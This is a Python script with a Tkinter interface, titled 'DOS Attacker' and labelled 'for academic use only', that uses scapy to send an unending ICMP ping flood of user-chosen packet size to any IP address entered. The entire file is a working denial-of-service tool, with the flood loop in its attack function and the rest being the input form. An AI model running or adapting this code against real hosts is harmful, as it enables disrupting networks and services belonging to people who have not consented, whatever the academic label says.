from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import time
import random
from tkinter import *
from tkinter import messagebox


def attack():
    try:
        target_ip = ip.get()
        packet_size = int(packet.get())
        delay_time = float(delay.get())
    except ValueError:
        print('[*] Values are missing / invalid in the input.')
        messagebox.showwarning('Oopsie!', 'Incorrect / Missing Values in the entry boxes!')
        return

    print(f"[+] Sending ICMP flood to {target_ip}...")

    try:
        while True:
            pkt = IP(dst=target_ip) / ICMP() / ("X" * packet_size)
            send(pkt, verbose=0)
            time.sleep(delay_time * random.uniform(0.2, 0.6))
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")


bg_colour = '#f2223e'
text_colour = '#ffffff'

root = Tk()
root.title('DOS Attacker')
root.geometry('1000x325')
root.config(bg=bg_colour)

title = Label(
    root,
    width=100,
    text='DOS SIMULATOR - FOR ACADEMIC USE ONLY',
    bg=bg_colour,
    fg=text_colour,
    font=('Rawline Black', 20),
    justify='center'
)
title.pack()

subtitle = Label(
    root,
    width=100,
    text='Enter the IP, Packet Size and Delay.',
    bg=bg_colour,
    fg=text_colour,
    font=('Rawline Black', 15),
    justify='center'
)
subtitle.pack(pady=5)

ip_header = Label(
    root,
    width=100,
    text='IP Address',
    bg=bg_colour,
    fg=text_colour,
    font=('Rawline Black', 10),
    justify='left'
)
ip_header.pack()

ip = Entry(
    root,
    width=100,
    font=('Rawline Black', 10),
    justify='center'
)
ip.pack()

delay_header = Label(
    root,
    width=100,
    text='Delay',
    bg=bg_colour,
    fg=text_colour,
    font=('Rawline Black', 10),
    justify='left'
)
delay_header.pack()

delay = Entry(
    root,
    width=100,
    font=('Rawline Black', 10),
    justify='center',
)
delay.insert(0, '0.01')

delay.pack()

packet_header = Label(
    root,
    width=100,
    text='Packet Size',
    bg=bg_colour,
    fg=text_colour,
    font=('Rawline Black', 10),
    justify='left'
)
packet_header.pack()

packet = Entry(
    root,
    width=100,
    font=('Rawline Black', 10),
    justify='center'
)
packet.insert(0, '1000')

packet.pack()

enter = Button(
    root,
    width=100,
    text='SUBMIT',
    font=('Rawline Black', 11),
    command=attack,
    bg=text_colour,
    borderwidth=0,
)
enter.pack(pady=30)

root.mainloop()
